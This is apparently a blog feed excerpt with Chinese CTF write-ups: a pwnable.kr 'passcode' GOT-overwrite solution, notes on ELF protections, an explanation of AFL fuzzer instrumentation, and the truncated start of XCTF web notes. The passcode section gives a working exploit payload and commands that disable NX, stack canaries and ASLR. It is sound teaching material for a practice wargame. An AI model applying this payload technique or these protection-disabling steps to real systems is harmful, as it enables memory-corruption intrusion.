flag</font></h4><p><img src="/images/83-6.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-基础知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-基础知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、基础知识&lt;/font&gt;&lt;/
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>bash 漏洞（pwnable-shellshock）</title>
    <link href="https://muzibing.github.io/2019/09/17/2019.09.17%EF%BC%8882%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/09/17/2019.09.17（82）/</id>
    <published>2019-09-16T16:00:00.000Z</published>
    <updated>2019-09-18T08:55:07.986Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-前言font"><a class="markdownIt-Anchor" href="#font-color-brown一-前言font"></a> <font color="brown">一、前言</font></h3><blockquote><p>pwn 是 CTF 比赛中重要的一种题型，但是对于 pwn 的入门可以这样形容：入门难、精通更难、入神超难，是因为 pwn 中所涉及的题型太多、太深，所以对于没有接触过 pwn 的人来说，刚开始的学习尤为困难，比如像我这种菜鸡。今天我就来介绍一下 pwn 中的涉及 bash 的一种题型吧。</p></blockquote><h3 id="font-color-brown二-基础知识font"><a class="markdownIt-Anchor" href="#font-color-brown二-基础知识font"></a> <font color="brown">二、基础知识</font></h3><h4 id="font-color-navy1setresuidfont"><a class="markdownIt-Anchor" href="#font-color-navy1setresuidfont"></a> <font color="navy">1.setresuid</font></h4><blockquote><p>setresuid() 被执行的条件有：</p><p>    ① 当前进程的 euid 是 root</p><p>    ② 三个参数，每个等于原来某个 id 中的一个</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-前言font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-前言font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、前言&lt;/font&gt;&lt;/h3&gt;
&lt;b
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>GOT 表攻击实例（pwnbable.kr_passcode）</title>
    <link href="https://muzibing.github.io/2019/09/10/2019.09.10%EF%BC%8881%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/09/10/2019.09.10（81）/</id>
    <published>2019-09-09T16:00:00.000Z</published>
    <updated>2019-09-24T08:53:09.582Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-前言font"><a class="markdownIt-Anchor" href="#font-color-brown一-前言font"></a> <font color="brown">一、前言</font></h3><blockquote><p>pwn 是 CTF 比赛中重要的一种题型，但是对于 pwn 的入门可以这样形容：<font color="orage">入门难、精通更难、入神超难</font>，是因为 pwn 中所涉及的题型太多、太深，所以对于没有接触过 pwn 的人来说，刚开始的学习尤为困难，比如像我这种菜鸡。今天我就来介绍一下 pwn 中的涉及 GOT 表的一种题型吧。</p></blockquote><h3 id="font-color-brown二-基础知识font"><a class="markdownIt-Anchor" href="#font-color-brown二-基础知识font"></a> <font color="brown">二、基础知识</font></h3><h4 id="font-color-navy1got-表font"><a class="markdownIt-Anchor" href="#font-color-navy1got-表font"></a> <font color="navy">1.GOT 表</font></h4><blockquote><p><strong>① 什么是 GOT 表？</strong></p><p>    每一个<font color="red"><strong>外部定义的符号</strong></font>在全局偏移表（<em>Global offset Table</em>）中有相应的条目，GOT位于ELF的<font color="red"><strong>数据段</strong></font>中，叫做GOT段。</p><p><strong>② GOT 表的作用是什么？</strong></p><p>    把位置无关的地址计算重定位到一个绝对地址。程序首次调用某个库函数时，运行时连接编辑器（<code>rtld</code>）找到相应的符号，并将它重定位到GOT之后每次调用这个函数都会将控制权直接转向那个位置，而不再调用<code>rtld</code>。</p><p><strong>③ 怎么查看 GOT 表？</strong></p><p>    在 Linux 系统里，我们可以通过  <code>objdump</code> 命令来查看程序的 GOT 表，具体的指令如下：</p><center> objdump  -R  file_name</center></blockquote><h4 id="font-color-navy2plt-表font"><a class="markdownIt-Anchor" href="#font-color-navy2plt-表font"></a> <font color="navy">2.PLT 表</font></h4><blockquote><p><strong>① 什么是 PLT 表？</strong></p><p>    过程连接表(<em>Procedure Linkage Table</em>)，一个PLT条目对应一个GOT条目。</p><p><br>    当 main() 函数开始，会请求 plt 中这个函数的对应 GOT 地址，如果第一次调用那么 GOT 会重定位到 plt，并向栈中压入一个偏移，程序的执行回到 _init() 函数，rtld得以调用就可以定位 printf 的符号地址，第二次运行程序再次调用这个函数时程序跳入 plt，对应的 GOT 入口点就是真实的函数入口地址。</p><p><br>    动态连接器并不会把动态库函数在编译的时候就包含到 ELF 文件中,仅仅是在这个 ELF 被加载的时候,才会把那些动态函库数代码加载进来,之前系统只会在 ELF 文件中的 GOT 中保留一个调用地址。</p><p><strong>② GOT 表和 PLT 表的关系图</strong></p><p><img src="/images/81-1.png" alt></p></blockquote><h4 id="font-color-navy3scanf-的漏洞font"><a class="markdownIt-Anchor" href="#font-color-navy3scanf-的漏洞font"></a> <font color="navy">3.scanf 的漏洞</font></h4><blockquote><p>    如果对 scanf 的利用不加 &amp; ，会很有可能出现漏洞，在这道题目中，我将讲述该函数的漏洞利用。</p></blockquote><h4 id="font-color-navy4elf-文件保护机制font"><a class="markdownIt-Anchor" href="#font-color-navy4elf-文件保护机制font"></a> <font color="navy">4.ELF 文件保护机制</font></h4><blockquote><p><font color="orage"><strong>① NX(No-eXecute)</strong> </font></p><p>    NX 即 No-eXecute （不可执行）的意思，NX（DEP）的基本原理是<font color="red">将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</font></p><p><br>    工作原理如图：</p><p><img src="/images/81-2.jpg" alt></p><p>     gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。</p><p>     例如：</p><center>gcc -z execstack -o test test.c</center><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; gcc -o test test.c <span class="comment">// 默认情况下，开启NX保护</span></span><br><span class="line">&gt; gcc -z execstack -o test test.c<span class="comment">// 禁用NX保护</span></span><br><span class="line">&gt; gcc -z noexecstack -o test test.c <span class="comment">// 开启NX保护</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><font color="orage"><strong>② RELRO</strong></font></p><p>     relro 是一种用于加强对 binary 数据段的保护的技术。设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为 ” <font color="red">Partial RELRO</font> ”，说明我们对GOT表具有写权限。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; gcc -o test test.c <span class="comment">// 默认情况下，是Partial RELRO</span></span><br><span class="line">&gt; gcc -z norelro -o test test.c <span class="comment">// 关闭，即No RELRO</span></span><br><span class="line">&gt; gcc -z lazy -o test test.c <span class="comment">// 部分开启，即Partial RELRO</span></span><br><span class="line">&gt; gcc -z now -o test test.c <span class="comment">// 全部开启，即</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><font color="orage"><strong>③ CANNARY（栈保护）</strong></font></p><p>    这个选项<strong>表示栈保护功能有没有开启</strong>。</p><p><br>    栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><p><br>    因此在编译时可以控制是否开启栈保护以及程度，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; gcc -o test test.c // 默认情况下，不开启Canary保护</span><br><span class="line">&gt; gcc -fno-stack-protector -o test test.c //禁用栈保护</span><br><span class="line">&gt; gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">&gt; gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><font color="orage"><strong>④ FORTIFY</strong></font></p><p>    fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。</p><p><br>    _FORTIFY_SOURCE设为1，并且将编译器设置为优化1(<em>gcc -O1</em>)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能</p><p><br>    _FORTIFY_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。</p><p>     <code>gcc -D_FORTIFY_SOURCE=1</code> 仅仅只会在编译时进行检查 (特别像某些头文件 <code>#include &lt;string.h&gt;</code>)</p><p>     <code>gcc -D_FORTIFY_SOURCE=2</code> 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序)</p><p><font color="orage"><strong>⑤ PIE(ASLR)</strong></font></p><p>     PIE 即 <a href="https://zh.wikipedia.org/wiki/%E5%9C%B0%E5%9D%80%E6%97%A0%E5%85%B3%E4%BB%A3%E7%A0%81" target="_blank" rel="noopener">Postion-Indenpendent executable</a>(地址无关可执行文件)。一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p><p><br>    内存地址随机化机制（address space layout randomization)，有以下三种情况</p><p><br>    0 - 表示关闭进程地址空间随机化。</p><p>    1 - 表示将mmap的基址，stack和vdso页面随机化。</p><p>    2 - 表示在1的基础上增加栈（heap）的随机化。</p><p><br>    可以防范基于<font color="red"><strong>Ret2libc</strong></font>方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p><p><br>    Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p><p><br>    liunx下关闭PIE的命令如下：</p><p><code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p></blockquote><h4 id="font-color-navy5got-表覆写技术font"><a class="markdownIt-Anchor" href="#font-color-navy5got-表覆写技术font"></a> <font color="navy">5.GOT 表覆写技术</font></h4><blockquote><p>    原理：由于<font color="red"><strong>got表是可写</strong></font>的，把其中的函数地址覆盖为我们shellcode地址，在程序进行调用这个函数时就会执行shellcode。</p></blockquote><h3 id="font-color-brown三-题目要求font"><a class="markdownIt-Anchor" href="#font-color-brown三-题目要求font"></a> <font color="brown">三、题目要求</font></h3><p><img src="/images/81-3.png" alt></p><blockquote><p>    该题要求我们连接 <a href="http://pwnable.kr" target="_blank" rel="noopener">pwnable.kr</a> 的服务器，密码是 guest，经过尝试我在 Linux 系统环境下连上去以后，看看了目录，如下：</p></blockquote><p><img src="/images/81-4.png" alt></p><blockquote><p>    题目可能是让我们通过这三个文件找出 flag。</p></blockquote><h3 id="font-color-brown四-解题思路font"><a class="markdownIt-Anchor" href="#font-color-brown四-解题思路font"></a> <font color="brown">四、解题思路</font></h3><blockquote><p>    在整理出解题思路之前，我们需要试探一下题目中的文件，看看文件有什么要求。</p><p><font color="orage"><strong>① 查看 passcode 的文件类型</strong></font></p><center>`file passcode`</center>![](/images/81-6.png)<p>    从上图可以看出，passcode 是一个 32 位的 ELF 文件。</p><p><font color="orage"><strong>② 查看 passcode 的保护机制</strong> </font></p><center>`checksec passcode`</center>![](/images/81-5.png)<p>    从上图可以说明：</p><ul><li>passcode 文件是 i386 的</li><li>我们对 GOT 有写的权限</li><li>开启了栈保护，也就意味着我们没有办法利用栈溢出</li></ul><p><font color="orage">**③ 查看 passcode.c 的源文件 **</font></p><p><img src="/images/81-7.png" alt></p><p>    从上图可以看到 scanf 语句中没有 <code>&amp;</code> 取值符号，所以我们可以根据这个来利用漏洞</p><p><font color="orage"><strong>④ 查看 welcome 和 login 函数</strong> </font></p><p>    通过分析 passcode.c 的源代码，我们可以发现 main（caller）连续调用了 welcome 和 login 函数，在调用的时候并没有 push 和 pop，所有这两个函数用的是同一个 ebp，如下图：</p><p><img src="/images/81-8.png" alt></p><p>    那么我们找到name位于ebp-0x70，passcode1位于ebp-0x10，passcode2位于ebp-0xc，name与passcode1之间隔了0x70-0x10=96个字节。</p><p><font color="orage"><strong>⑤ 如何利用 scanf 和 GOT 表漏洞</strong></font></p><p>   我们可以用 fflush() / printf() 的地址覆盖 passcode1 后，scanf(&quot;%d&quot;，&amp;fflush()) 将会把之后的输入写入到GOT表中，于是把 login() 中 system(&quot;/bin/cat flag&quot;) 的地址转换成十进制写进去，当程序调用fflush()的时候就会执行system()，思路如下图：</p><p><img src="/images/81-9.png" alt></p></blockquote><h3 id="font-color-brown五-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-brown五-解题步骤font"></a> <font color="brown">五、解题步骤</font></h3><h4 id="font-color-navy1构造-payloadfont"><a class="markdownIt-Anchor" href="#font-color-navy1构造-payloadfont"></a> <font color="navy">1.构造 payload</font></h4><blockquote><p>payload = ‘a’*96+’\x00\xa0\x04\x08’ +‘134514147\n’</p></blockquote><h4 id="font-color-navy2python-c-执行命令font"><a class="markdownIt-Anchor" href="#font-color-navy2python-c-执行命令font"></a> <font color="navy">2.python -c 执行命令</font></h4><blockquote><p><code>python - c &quot;print('a'*96+'\x00\xa0\x04\x08' +'134514147\n')&quot;|./passcode</code></p><p>    结果如下图：</p><p><img src="/images/81-10.png" alt></p></blockquote><h3 id="font-color-brown参考文章font"><a class="markdownIt-Anchor" href="#font-color-brown参考文章font"></a> <font color="brown">参考文章</font></h3><p><a href="https://blog.csdn.net/qq_18661257/article/details/54694748" target="_blank" rel="noopener">GOT表和PLT表知识详解</a></p><p><a href="https://blog.csdn.net/kevin66654/article/details/78213690" target="_blank" rel="noopener">pwnable.kr - passcode</a></p><p><a href="https://blog.csdn.net/smalosnail/article/details/53027024" target="_blank" rel="noopener">pwnable 笔记 Toddler’s Bottle - passcode</a></p><p><a href="https://blog.csdn.net/smalosnail/article/details/53247502" target="_blank" rel="noopener">scanf忘记加’&amp;'危害有多大？ 详解GOT表覆写攻击技术</a></p><p><a href="https://www.cnblogs.com/p4nda/p/7122094.html" target="_blank" rel="noopener">p4nda</a></p><p><a href="https://blog.csdn.net/u012763794/article/details/51992512" target="_blank" rel="noopener">通过pwnable.kr从零学pwn</a></p><p><a href="https://blog.csdn.net/summonlight/article/details/81123785" target="_blank" rel="noopener">C语言函数调用栈(一)</a></p><p><a href="https://blog.csdn.net/axiejundong/article/details/73065023" target="_blank" rel="noopener">软件常用安全防护手段 checksec 总结</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-前言font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-前言font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、前言&lt;/font&gt;&lt;/h3&gt;
&lt;b
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>AFL 的代码插桩问题</title>
    <link href="https://muzibing.github.io/2019/09/07/2019.09.07%EF%BC%8880%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/09/07/2019.09.07（80）/</id>
    <published>2019-09-06T16:00:00.000Z</published>
    <updated>2019-09-07T10:36:22.237Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-什么是-aflfont"><a class="markdownIt-Anchor" href="#font-color-brown一-什么是-aflfont"></a> <font color="brown">一、什么是 AFL？</font></h3><blockquote><p>    AFL 是一款用于发现漏洞的<font color="red"><strong>模糊测试工具</strong></font>，是由下面三个部分组成的：</p><ul><li><p>编译器wrapper：他的功能在于对目标软件（开源）进行编译，编译过程中插入一些AFL识别的函数用以识别探索路径，众所周知的linux下的C/C<ins>编译工具gcc/g</ins>，afl的编译工具为afl-gcc/afl-g++,afl-clang等。</p></li><li><p>测试器fuzzer （主体）：<code>afl-fuzz</code>，就是AFL重要的主体，用以对软件进行fuzzing。</p></li><li><p>其他工具：如afl-cmin,afl-tmin等，一个成功的C位都必须多个辅助才行，这些工具都是为提升测试的效率和成功率而服务的。</p></li></ul><p>  它的工作流程如下图：</p><p><img src="/images/80-1.png" alt></p></blockquote><h3 id="font-color-brown二-代码插桩font"><a class="markdownIt-Anchor" href="#font-color-brown二-代码插桩font"></a> <font color="brown">二、代码插桩</font></h3><h4 id="font-color-navy1什么是插桩font"><a class="markdownIt-Anchor" href="#font-color-navy1什么是插桩font"></a> <font color="navy">1.什么是插桩？</font></h4><blockquote><p>    在AFL编译文件时候afl-gcc会在规定位置插入桩代码，可以理解为一个个的<font color="red"><strong>探针</strong></font>(但是没有暂停功能)，在后续fuzz的过程中会<font color="red"><strong>根据这些桩代码进行路径探索，测试等</strong>。</font>对于插桩的理解也可以这样理解，如下图：</p><p><img src="/images/80-2.jpg" alt></p><p>    如果我们输入的数据是：a = 3,b = 3，那么程序会输出多少呢？通过程序的执行可以得到一个路径：<font color="red">ABDCFG</font>，那么在这个程序里 printf 语句就是我们插入的代码。</p><p>​    在简单的了解了什么是插桩后，下面我们来介绍一下 afl 中的插桩。</p></blockquote><h4 id="font-color-navy2afl-中的插桩font"><a class="markdownIt-Anchor" href="#font-color-navy2afl-中的插桩font"></a> <font color="navy">2.AFL 中的插桩</font></h4><blockquote><p><strong>① 插桩存在 afl 测试中的哪一个环节？</strong></p><p>​     <img src="/images/80-3.png" alt></p><p>​     从上面的图中可以得出，AFL 的插桩是在编译的过程中同时进行插桩的，afl-gcc 是 afl 的一个编译器，是将源语言编译成汇编代码，而插桩是在汇编代码汇编成机器代码的过程中进行的，对于linux来说，as 是常用的汇编器，那么 afl-as 便会作为汇编器，执行实际的汇编操作。<font color="red">所以说，AFL 的代码插桩，就是将源文件编译成汇编代码后，通过<code>afl-as</code>来完成的</font>。 afl-as 会生成<strong>一个随机数</strong>，作为标识分支的 key。</p><p><img src="/images/80-5.png" alt></p><p>​     在这里需要值得注意的是，实际插桩是 <code>afl-as</code> 来完成的，那么为什么又说 <code>afl-gcc</code> 是来插桩的呢？因为 afl-gcc 的源码中在头文件中调用了 afl-as.h 所以说是将 afl-as 的功能装进了 afl-gcc 里。</p><p><img src="/images/80-4.jpg" alt></p><p><strong>② AFL 中的编译器</strong></p><p>​     对于 afl 的编译器来说有两种，一种是 afl-gcc，一种是 afl-clang，通过查看源码可以得到，这两个编译器实际上是 gcc、clang 的一个 wrapper。</p><p><strong>③ 如何进行插桩</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">add_instrumentation</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">&gt;     <span class="keyword">if</span> (input_file)</span><br><span class="line">&gt;    &#123; <span class="comment">//打开输入文件</span></span><br><span class="line">&gt;         inf = fopen(input_file, <span class="string">"r"</span>);</span><br><span class="line">&gt;         <span class="keyword">if</span> (!inf) PFATAL(<span class="string">"Unable to read '%s'"</span>, input_file);</span><br><span class="line">&gt;     &#125; </span><br><span class="line">&gt;     <span class="keyword">else</span> </span><br><span class="line">&gt;         inf = <span class="built_in">stdin</span>;</span><br><span class="line">&gt;     outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="number">0600</span>); <span class="comment">//创建输出文件</span></span><br><span class="line">&gt;     <span class="keyword">if</span> (outfd &lt; <span class="number">0</span>) </span><br><span class="line">&gt;         PFATAL(<span class="string">"Unable to write to '%s'"</span>, modified_file);</span><br><span class="line">&gt;     outf = fdopen(outfd, <span class="string">"w"</span>);</span><br><span class="line">&gt;     <span class="keyword">if</span> (!outf) </span><br><span class="line">&gt;         PFATAL(<span class="string">"fdopen() failed"</span>); </span><br><span class="line">&gt;     <span class="keyword">while</span> (fgets(line, MAX_LINE, inf)) <span class="comment">//读取输入的每行</span></span><br><span class="line">&gt;     &#123; </span><br><span class="line">&gt;         <span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp; <span class="comment">//它只会在代码里的合适位置插桩而不会对文件每行插桩，判断代码在下面，</span></span><br><span class="line">&gt;         instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">'\t'</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) </span><br><span class="line">&gt;         &#123;</span><br><span class="line">&gt;             <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, <span class="comment">//关键处，会根据位数选择对应模板</span></span><br><span class="line">&gt;             R(MAP_SIZE)); <span class="comment">//R(MAP_SIZE)定义为 # define R(x) (random() % (x))</span></span><br><span class="line">&gt;             instrument_next = <span class="number">0</span>;</span><br><span class="line">&gt;             ins_lines++;</span><br><span class="line">&gt;         &#125;</span><br><span class="line">&gt;         <span class="built_in">fputs</span>(line, outf); <span class="comment">//输出</span></span><br><span class="line">&gt;         <span class="comment">//以下为如上插桩条件判断代码。。。</span></span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>​     执行的插桩代码实际上是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE));</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>​     这里要以 32 位的模板为例，给出要插入的 <code>trampoline_fmt_32</code> 的汇编代码段，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt; static const u8* trampoline_fmt_32 =</span><br><span class="line">&gt; </span><br><span class="line">&gt;   &quot;\n&quot;</span><br><span class="line">&gt;   &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;</span><br><span class="line">&gt;   &quot;\n&quot;</span><br><span class="line">&gt;   &quot;.align 4\n&quot;</span><br><span class="line">&gt;   &quot;\n&quot;</span><br><span class="line">&gt;   &quot;leal -16(%%esp), %%esp\n&quot;</span><br><span class="line">&gt;   &quot;movl %%edi, 0(%%esp)\n&quot;</span><br><span class="line">&gt;   &quot;movl %%edx, 4(%%esp)\n&quot;</span><br><span class="line">&gt;   &quot;movl %%ecx, 8(%%esp)\n&quot;</span><br><span class="line">&gt;   &quot;movl %%eax, 12(%%esp)\n&quot;</span><br><span class="line">&gt;   &quot;movl $0x%08x, %%ecx\n&quot;</span><br><span class="line">&gt;   &quot;call __afl_maybe_log\n&quot;</span><br><span class="line">&gt;   &quot;movl 12(%%esp), %%eax\n&quot;</span><br><span class="line">&gt;   &quot;movl 8(%%esp), %%ecx\n&quot;</span><br><span class="line">&gt;   &quot;movl 4(%%esp), %%edx\n&quot;</span><br><span class="line">&gt;   &quot;movl 0(%%esp), %%edi\n&quot;</span><br><span class="line">&gt;   &quot;leal 16(%%esp), %%esp\n&quot;</span><br><span class="line">&gt;   &quot;\n&quot;</span><br><span class="line">&gt;   &quot;/* --- END --- */\n&quot;</span><br><span class="line">&gt;   &quot;\n&quot;;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>​    上面的汇编代码主要做了一下几个工作：</p><ul><li><p>保存 edi 等寄存器</p></li><li><p>将 ecx  的值设置为 fprintf() 所要打印的变量（key）内容</p></li><li><p>调用方法__afl_maybe_log()</p></li><li><p>恢复寄存器</p></li></ul><p><img src="/images/80-7.jpg" alt></p></blockquote><h4 id="font-color-navy3实现代码插桩的途径font"><a class="markdownIt-Anchor" href="#font-color-navy3实现代码插桩的途径font"></a> <font color="navy">3.实现代码插桩的途径</font></h4><blockquote><p>（1）它可以通过<strong>插入汇编代码</strong>直接在每个分支点周围用汇编来扩充二进制文件。</p><p>（2）它可以使用<strong>模拟器（QEMU）捕获无法重新编译</strong>的二进制文件的跟踪信息。</p><p>（3）它可以通过在<strong>LLVM中添加传递并添加汇编语言</strong>以“原则”方式执行操作。通过LLVM的方法（3）的一个优点是LLVM可以产生非常干净的中间表示（称为bitcode）</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-什么是-aflfont&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-什么是-aflfont&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、什么是 AFL
      
    
    </summary>
    
    
      <category term="二进制" scheme="https://muzibing.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="fuzz" scheme="https://muzibing.github.io/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>XCTF 新人阶段 — web</title>
    <link href="https://muzibing.github.io/2019/09/02/2019.09.02%EF%BC%8879%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/09/02/2019.09.02（79）/</id>
    <published>2019-09-01T16:00:00.000Z</published>
    <updated>2019-09-07T10:30:44.626Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Today I mainly write some notes about the web topic of the XCTF newcomer stage.The following is a list of topics.</p><ol><li>view source</li><li>get post</li><li>robots</li><li>backup</li><li>cookie</li><li>disabled button</li><li>simple js</li><li>xff referer</li><li>weak auth</li><li>webshell</li><li>command execution</li><li>simple php</li></ol></blockquote><blockquote><p>In order to make the knowledge points involved in each topic as clear as possible.I only summarize the knowledge points of the first two topics.</p></blockquote><h3 id="font-color-brown一-view-sourcefont"><a class="markdownIt-Anchor" href="#font-color-brown一-view-sourcefont"></a> <font color="brown">一、view source</font></h3><h4 id="font-color-navy1-question-requirmentfont"><a class="markdownIt-Anchor" href="#font-color-navy1-question-requirmentfont"></a> <font color="navy">1. Question requirment</font></h4><p><img src="/images/79-1.png" alt></p><h4 id="font-color-navy2basic-knowledgefont"><a class="markdownIt-Anchor" href="#font-color-navy2basic-knowledgefont"></a> <font color="navy">2.Basic knowledge</font></h4><blockquote><p>what is the role of browser F12?</p><ul><li><p><font color="blue"><strong>Elements</strong></font></p><p>It is used  to view  or modify the attributes of HTML elements ,CSS properties,listen events,breakpoints,and more.</p></li><li><p><font color="blue"><strong>Console</strong></font></p><p>The console is typically used to <em>execute</em> one-time code,view JavaScript objects,and view debug log information or <em>exception</em> information.</p></li><li><p><font color="blue"><strong>Sources</strong></font></p><p>The page is used to view the HTML source code of the current web page,JavaScript source code,CSS source code,and most importantly,you can debug(调试) the JavaScript source code,add breakpoints to the JS code and so on.</p></li><li><p><font color="blue"><strong>Network</strong></font></p><p>Network page is mainly used to view information related to the network connection such as the header.</p><p><img src="/images/79-2.png" alt></p><ul><li><strong>Header</strong>:The panel lists the resource request url,HTTP method,response status code,request header and response header and their respective values,request parameter,etc.</li><li><strong>Preview</strong>:View panel to view resource</li><li><strong>Response</strong>:The response information panel contains content that has not been formatted by resource</li><li><strong>Timing</strong>:The details of the resource request take time.</li></ul></li></ul></blockquote><h4 id="font-color-navy3problem-solving-stepfont"><a class="markdownIt-Anchor" 